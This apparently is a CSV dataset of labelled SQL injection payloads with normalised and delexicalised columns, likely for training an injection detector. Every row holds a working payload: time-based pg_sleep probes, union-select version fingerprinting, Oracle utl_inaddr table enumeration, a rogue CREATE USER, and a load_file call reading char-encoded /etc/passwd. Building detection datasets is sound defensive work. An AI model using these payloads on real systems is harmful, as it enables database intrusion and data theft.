payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
""" or pg_sleep  (  __TIME__  )  --",1,sqli_dataset.csv,,False,""" or pg_sleep ( __TIME__ ) --",""" or pg_sleep ( __TIME__ ) --"
create user name identified by pass123 temporary tablespace temp default tablespace users;,1,sqli_dataset.csv,,False,create user name identified by pass123 temporary tablespace temp default tablespace users;,create user <COL> identified by pass123 temporary tablespace temp default tablespace <TABLE>;
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,sqli_dataset.csv,,False,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 5 ) ) AND 'i' = 'i","AND <NUM> = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = <NUM> ) ) AND <STR> = 'i"
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or @ @1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or @ @<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,sqli_dataset.csv,,False,"select * from users where id = 1 or 1#"" ( union select 1,version ( ) -- 1","select * from <TABLE> where <COL> = <NUM> or <NUM>#"" ( union select <NUM>,version ( ) -- <NUM>"
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,sqli_dataset.csv,,False,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,select <COL> from syscolumns where <COL> = ( select <COL> from sysobjects where <COL> = tablename' ) --
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,sqli_dataset.csv,,True,select * from users where id = 1 +$+ or 1 = 1 -- 1,select * from <TABLE> where <COL> = <NUM> +$+ or <NUM> = <NUM> -- <NUM>
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,sqli_dataset.csv,,False,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;","<NUM>; ( load_file ( char ( <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM> ) ) ) ,<NUM>,<NUM>,<NUM>;"
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or ||/1 = 1 union select 1,version ( ) -- 1'","select * from <TABLE> where <COL> = <STR> or ||/<NUM> = <NUM> union select <NUM>,version ( ) -- <NUM>'"
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,sqli_dataset.csv,,False,"select * from users where id = '1' or \.<\ union select 1,@@VERSION -- 1'","select * from <TABLE> where <COL> = <STR> or \.<\ union select <NUM>,@@VERSION -- <NUM>'"
